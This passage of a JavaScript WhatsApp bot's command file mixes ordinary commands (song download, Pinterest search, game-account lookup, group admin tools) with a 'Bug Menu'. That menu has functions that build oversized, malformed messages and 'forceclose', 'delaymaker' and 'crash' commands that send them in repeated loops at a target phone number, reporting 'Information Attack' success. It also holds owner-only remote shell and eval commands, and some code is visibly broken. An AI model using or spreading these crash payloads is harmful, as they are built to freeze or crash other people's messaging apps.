 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: teks
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: global.namebot2
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 subtitle: global.namebot2,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: image }}, { upload: Hisoka.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "single_select",
 "buttonParamsJson": JSON.stringify(listMessage) 
 }, 
 ],
 })
 })
 }
 }
}, {})

await Hisoka.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break 
   case 'soundcloud': {
if (!text) return m.reply(`Enter song title.\nExample:\n.${command} where we are`);
HisokaReact()
  try {
    m.reply('Searching for song...');
    const search = await fetch(`https://zenz.biz.id/search/SoundCloud?query=${encodeURIComponent(text)}`);
    const result = await search.json();
    if (!result.status || !result.result || !result.result[0]) {
      return m.reply('Lagu not found.');
    }
    const url = result.result[0].url;
    const res = await fetch(`https://zenz.biz.id/downloader/SoundCloud?url=${encodeURIComponent(url)}`);
    const json = await res.json();
    if (!json.status || !json.audio_url) {
      return m.reply('Failed to download song.');
    }
    await Hisoka.sendMessage(m.chat, {
      audio: { url: json.audio_url },
      mimetype: 'audio/mpeg',
      ptt: false,
      fileName: `${json.title}.mp3`,
      caption: `Judul: ${json.title}\nAuthor: ${json.author}\nDurasi: ${json.duration}`,
      contextInfo: {
        externalAdReply: {
          title: json.title,
          body: json.author,
          thumbnailUrl: json.thumbnail,
          mediaType: 2,
          mediaUrl: json.source_url,
          sourceUrl: json.source_url,
          renderLargerThumbnail: true,
        },
      },
    }, { quoted: m });
  } catch (err) {
    console.error(err);
    m.reply('An error occurred.');
  }
};
break
case "pin":
      case "pinterest":
      HisokaReact()
        {
          async function pinterest(query) {
            try {
              const { data } = await axios.get(
                `https://api.vreden.my.id/api/pinterest?query=${encodeURIComponent(
                  query
                )}`
              );

              return data.result[
                Math.floor(Math.random() * data.result.length)
              ];
            } catch (err) {
              throw Error(err.message);
            }
          }

          if (!text) return m.reply(`*Incorrect Usage!*\nexample: .${command} Hisoka`);
          try {
            let hasil = await pinterest(text);
            if (!hasil) return m.reply("Image not found.");
            const buttons = [
              {
                buttonId: `.pin ${text}`,
                buttonText: {
                  displayText: "Next",
                },
                type: 1,
              },
            ];

            await Hisoka.sendMessage(
              m.chat,
              {
                image: { url: hasil },
                caption:
                  "Continue searching for similar images? Click the *Next* button below",
                footer: `${foother}`,
                buttons: buttons,
                headerType: 1,
                viewOnce: true,
              },
              { quoted: m }
            );
          } catch (err) {
            console.error(err.message);
            m.reply("An error occurred");
          }
        }
        
        break;
case 'play':
case 'song': {
if (!text) return reply(`*Incorrect Usage!*\nexample: .${command} Night change`)
HisokaReact()
let ytsSearchh = await yts(text)
const rees = await ytsSearchh.all[0]
var anu = await ytdl.ytmp3(`${rees.url}`)
 await Hisoka.sendMessage(m.chat, {image: {url: `${rees.thumbnail}` }, caption: `*[ Found ]*\n${rees.title}\n${rees.url}\n\nSending Audio...` }, {quoted: m})
 }
if (anu.status) {
let urlMp3 = anu.download.url
await Hisoka.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
break       
// =========== Bug Menu
// Func
async function VampireBlankIphone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐆𝐫𝐢𝐦𝐑𝐞𝐚𝐩𝐞𝐫" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await Kyzo.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}
async function FChyUi(target) {
let hyuiForceX = JSON.stringify({
status: true,
criador: "hyuiForcex",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const contextInfo = {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "𝙳𝚄𝙰𝚁 [ 𝟸 ] 🔥",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: hyuiForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",},
{ name: "call_permission_request", buttonParamsJson: hyuiForceX + "\u0003",},
]
}
}
}
}
};

await Kyzo.relayMessage(target, messagePayload, { participant: { jid: target } });
}
async function Blankhard(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Hisoka.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function InvisibleFC(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Hades Is Back!",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "Hades Is Back!",
                address: "Hades Is Back!",
              },
            },
            body: {
              text: "Hades Is Back!",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await Hisoka.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
case "fc-invis":
case "fclose":
case "forceclose": {
if (!isOwner&&!isPremium) return reply(mess.prem)
if (!q) return reply(`*Wrong Format!*\nExample: ${prefix + command} 62xxx`)
    
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let isTarget = pelaku + "@s.whatsapp.net"
await Hisoka.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
for (let r = 0; r < 80; r++) {
await InvisibleFC(isTarget);
await InvisibleFC(isTarget, Ptcp = true)
await sleep(5000)
await InvisibleFC(isTarget);
await InvisibleFC(isTarget, Ptcp = true)
}
    
let put = `*Information Attack*
* Target : ${pelaku}
* Status : Success
`
await Hisoka.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
reply(put)
}

break
case "delayinvis":
case "delaymaker": {
if (!isOwner&&!isPremium) return reply(mess.prem)
if (!q) return reply(`*Wrong Format!*\nExample: ${prefix + command} 62xxx`)
    
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let isTarget = pelaku + "@s.whatsapp.net"
await Hisoka.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
for (let r = 0; r < 80; r++) {
await Blankhard(isTarget);
await Blankhard(isTarget, Ptcp = true)
await sleep(5000)
await Blankhard(isTarget);
await Blankhard(isTarget, Ptcp = true)
}
    
let put = `*Information Attack*
* Target : ${pelaku}
* Status : Success
`
await Hisoka.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
reply(put)
}

break
case "crash":
 case "delayip": {
if (!isOwner&&!isPremium) return reply(mess.prem)
if (!q) return reply(`*Wrong Format!*\nExample: ${prefix + command} 62xxx`)
    
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let isTarget = pelaku + "@s.whatsapp.net"
await Hisoka.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
for (let r = 0; r < 50; r++) {
await VampireBlankIphone(isTarget);
await sleep(5000)
await FChyUi(isTarget, Ptcp = true)
}
    
let put = `*Information Attack*
* Target : ${pelaku}
* Status : Success
`
await Hisoka.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
reply(put)
}

break

// Area Tambah Fitur
case "addcase": {
  if (!isOwner) return reply(mess.owner);
  if (!text) return reply("where is the case")
const namaFile = path.join(__dirname, 'Hisoka.js');
      const caseBaru = `${text}\n\n`;
      const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
          const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
          return {
            success: true,
            kodeBaruLengkap
          };
        } else {
          return {
            success: false,
            message: "Cannot find default case in file!"
          };
        }
      };
      fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
          console.error('An error occurred while reading file:', err);
          return m.reply(`An error occurred while reading file: ${err.message}`);
        }
        const result = tambahCase(data, caseBaru);
        if (result.success) {
          fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
              console.error('An error occurred while writing file:', err);
              return m.reply(`An error occurred while writing file: ${err.message}`);
            } else {
              console.log('Sukses menambahkan case baru:');
              console.log(caseBaru);
              return m.reply('Successfully added case!');
            }
          });
        } else {
          console.error(result.message);
          return m.reply(result.message);
        }
      });
    }
    break
case 'delcase': {
      if (!isOwner) return reply(mess.owner)
      if (!text) return m.reply(`Example: ${command} nama case`);
      const fs = require('fs').promises;
      async function dellCase(filePath, caseNameToRemove) {
        try {
          let data = await fs.readFile(filePath, 'utf8');
          const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
          const modifiedData = data.replace(regex, '');
          if (data === modifiedData) {
            m.reply('Case not found or already deleted.');
            return;
          }
          await fs.writeFile(filePath, modifiedData, 'utf8');
          m.reply('Successfully deleted case!');
        } catch (err) {
          m.reply(`An error occurred: ${err.message}`);
        }
      }
      dellCase('./Hisoka.js', q);
    }
    break
        case 'getcase': {
      if (!isOwner) return reply(mess.owner)
      if (!text) return m.reply(`Example: ${command} caseName1 caseName2 caseName3 ...`)

      const caseNames = text.split(' ').map(name => name.trim()).filter(name => name)
      if (caseNames.length === 0) {
        return m.reply(`Enter minimal satu case name. Example: ${p_c} caseName1 caseName2`)
      }

      const getCase = async (caseName) => {
        try {
          const fileContent = await fs.promises.readFile('./Hisoka.js', "utf-8")
          const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g')
          const match = fileContent.match(caseRegex)
          if (!match) {
            return `Case '${caseName}' not found.`
          }
          return match[0]
        } catch (error) {
          return `An error occurred while reading file: ${error.message}`
        }
      }

      const getCases = async (caseNames) => {
        try {
          const casePromises = caseNames.map(caseName => getCase(caseName))
          const cases = await Promise.all(casePromises)
          return cases.join('\n\n')
        } catch (error) {
          return `An error occurred: ${error.message}`
        }
      }

      getCases(caseNames)
        .then(caseCode => m.reply(caseCode))
        .catch(error => m.reply(`An error occurred: ${error.message}`))
    }
    break
            case "setnamabot":
            case "setbotname":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!text) {
 return reply(`Where is the name?\nExample: ${prefix + command} Hisoka`);
 }
 await Hisoka.updateProfileName(text);
 reply(`Success in changing the name of bot's number`);
 }
 break;
 case "setbiobot":
 case "setbotbio":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!text) {
 return reply(`Where is the text?\nExample: ${prefix + command} Hisoka`);
 }
 await Hisoka.updateProfileStatus(text);
 reply(`Success in changing the bio of bot's number`);
 }
 break;

case "creategc":
 case "creategroup":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!args.join(" ")) {
 return reply(`Use ${prefix + command} groupname`);
 }
 try {
 let cret = await Hisoka.groupCreate(args.join(" "), []);
 let response = await Hisoka.groupInviteCode(cret.id);
 teks = ` 「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
 `;
 Hisoka.sendMessage(m.chat, {
 text: teks,
 mentions: await Hisoka.parseMention(teks)
 }, {
 quoted: m
 });
 } catch {
 reply("Oops! Error occurred, please report to owner for fixing");
 }
 }
 break;


case "restart":
 if (!isOwner) {
 return reply(mess.owner);
 }
 reply(`Restarting ${namaBot}`);
 reply(`Success`);
 await sleep(3000);
 process.exit();
 break;
                        case 'speed': case 'ping': {
                                try {
                                        const used = process.memoryUsage();
                                        const cpus = os.cpus().map(cpu => {
                                                cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
                                                return cpu;
                                        });
                                        const cpu = cpus.reduce((last, cpu, _, { length }) => {
                                                last.total += cpu.total;
                                                last.speed += cpu.speed / length;
                                                last.times.user += cpu.times.user;
                                                last.times.nice += cpu.times.nice;
                                                last.times.sys += cpu.times.sys;
                                                last.times.idle += cpu.times.idle;
                                                last.times.irq += cpu.times.irq;
                                                return last;
                                        }, {
                                                speed: 0,
                                                total: 0,
                                                times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 }
                                        });
                                        let start = performance.now();
                                        let end = performance.now();
                                        let latensi = end - start;
                                        let osInfo = await nou.os.oos();
                                        let storage = await nou.drive.info();
                                        let respon = `✨ *WhatsApp Bot Information* ✨\n\n📡 *Server Network*\n · *Ping:* ${latensi.toFixed(4)} Seconds\n\n🖥️ *Server Information*\n · *OS:* ${osInfo}\n · *IP Address:* ${nou.os.ip()}\n · *OS Type:* ${nou.os.type()}\n\n💾 *RAM:*\n · *Total:* ${formatp(os.totalmem())}\n · *Used:* ${formatp(os.totalmem() - os.freemem())}\n\n📂 *Storage:*\n · *Total:* ${storage.totalGb} GB\n · *Used:* ${storage.usedGb} GB (${storage.usedPercentage}%)\n · *Available:* ${storage.freeGb} GB (${storage.freePercentage}%)\n\n⏳ *Server Uptime:*\n${runtime(process.uptime())}\n\n⚙️ *CPU (${cpus.length} Core)*\n · *Model:* ${cpus[0].model.trim()}\n · *Speed:* ${cpu.speed} MHz\n${Object.keys(cpu.times).map(type => ` · *${type}*: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n`;
                                        await Hisoka.sendMessage(m.chat, {
                                                text: respon,
                                                contextInfo: {
                                                        mentionedJid: [m.sender],
                                                        forwardingScore: 999999, 
                                                        isForwarded: true, 
                                                        forwardedNewsletterMessageInfo: {
                                                                newsletterName: foother,
                                                                newsletterJid: idch,
                                                        },
                                                        externalAdReply: {
                                                                title: foother,
                                                                thumbnailUrl: `https://files.catbox.moe/${['k3xvf0', '3w0llo', 'pkmiz6', '9gs4q5'][Math.floor(Math.random() * 4)]}.jpg`,
                                                                sourceUrl: ch,
                                                                mediaType: 1,
                                                                renderLargerThumbnail: false
                                                        }
                                                }
                                        }, { quoted: m });
                                } catch (err) {
                                        console.error(err);
                                }
                        }
                        break;
                        case 'stalkff': {
      try {
        if (!text) return m.reply(`Example: ${command} 12345678`)
        const apiUrl = await fetchJson(`https://vapis.my.id/api/ff-stalk?id=${text}`)
        const ffData = apiUrl.data.account
        if (ffData) {
          const guild = apiUrl.data.guild
          const response = `
*Nama Akun:* ${ffData.name}
*Level:* ${ffData.level}
*Region:* ${ffData.region}
*Like:* ${ffData.like}
*Bio:* ${ffData.bio}
*Guild:* ${guild.name} (Level ${guild.level})
*BR Points:* ${ffData.BR_points}
*CS Points:* ${ffData.CS_points}
*Pet:* ${apiUrl.data.pet_info.name} (Level ${apiUrl.data.pet_info.level})
      `
          m.reply(response)
        } else {
          m.reply('Data not found')
        }
      } catch (err) {
        console.error(err)
        m.reply('An error occurred')
      }
    }
    break
     case 'stalkml': {
      try {
        if (!text) return m.reply(`Example: ${command} 109088431, 2558`)
        const [id, zoneId] = text.split(',') || text.split(', ')
        if (!id || !zoneId) return m.reply('Enter id dan zoneid')

        const apiUrl = await fetchJson(`https://vapis.my.id/api/ml-stalk?id=${id}&zoneid=${zoneId}`)
        const mlData = apiUrl.data.data
        if (mlData) {
          const product = mlData.product
          const item = mlData.item
          const response = `
*Game:* ${product.name}
*Item:* ${item.name}
*Harga:* ${item.price}
*Username Game:* ${mlData.gameDetail.userName}
*Channel Pembayaran:* ${mlData.paymentName}
*Deskripsi Produk:* ${product.description}
*Gambar Produk:* ${product.imageDisplay}
      `
          m.reply(response)
        } else {
          m.reply('Data not found')
        }
      } catch (err) {
        console.error(err)
        m.reply('An error occurred')
      }
    }
    break


default:
                if (budy.startsWith('$')) {
                    if (!isOwner) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                // Anti Wame
          if (global.antiWame)
  if (budy.includes(`https://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(mess.admin)
if (isOwner) return reply(mess.owner)
kice = m.sender
        await Hisoka.sendMessage(m.chat,
                            {
                                delete: {
                                    remoteJid: m.chat,
                                    fromMe: false,
                                    id: m.key.id,
                                    participant: m.key.participant
                                }
                            })

                        Hisoka.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and it was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
// Anti Link Gc
if (global.Antilinkgc)
  if (budy.includes(`https://chat.whatsapp`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(mess.admin)
if (isOwner) return reply(mess.owner)
kice = m.sender
        await Hisoka.sendMessage(m.chat,
                            {
                                delete: {
                                    remoteJid: m.chat,
                                    fromMe: false,
                                    id: m.key.id,
                                    participant: m.key.participant
                                }
                            })

                        Hisoka.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and it was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
// Antilink Ch
if (global.Antilinkch)
  if (budy.includes(`https://whatsapp.com/channel/`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(mess.admin)
if (isOwner) return reply(mess.owner)
kice = m.sender
        await Hisoka.sendMessage(m.chat,
                            {
                                delete: {
                                    remoteJid: m.chat,
                                    fromMe: false,
                                    id: m.key.id,
                                    participant: m.key.participant
                                }
                            })

                        Hisoka.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and it was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
// Anti Link Ig
if (global.Antilinkig)
  if (budy.includes(`https://www.instagram.com/`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(mess.admin)
if (isOwner) return reply(mess.owner)
kice = m.sender
        await Hisoka.sendMessage(m.chat,
                            {
                                delete: {
                                    remoteJid: m.chat,
                                    fromMe: false,
                                    id: m.key.id,
                                    participant: m.key.participant
                                }
                            })

                        Hisoka.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and it was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
// Antilinkall
if (global.Antilinkall)
  if (budy.includes(`https://`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(mess.admin)
if (isOwner) return reply(mess.owner)
kice = m.sender
        await Hisoka.sendMessage(m.chat,
                            {
                                delete: {
                                    remoteJid: m.chat,
                                    fromMe: false,
                                    id: m.key.id,
                                    participant: m.key.participant
                                }
                            })

                        Hisoka.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and it was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//
if (global.autobio) {
                        Hisoka.updateProfileStatus(`${namaBot} Running for ${runtime(process.uptime())}`).catch(_ => _);
                }
//

                if (budy.startsWith('>')) {
                    if (!isOwner) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await reply(evaled);
                    } catch (err) {
                        reply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isOwner) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
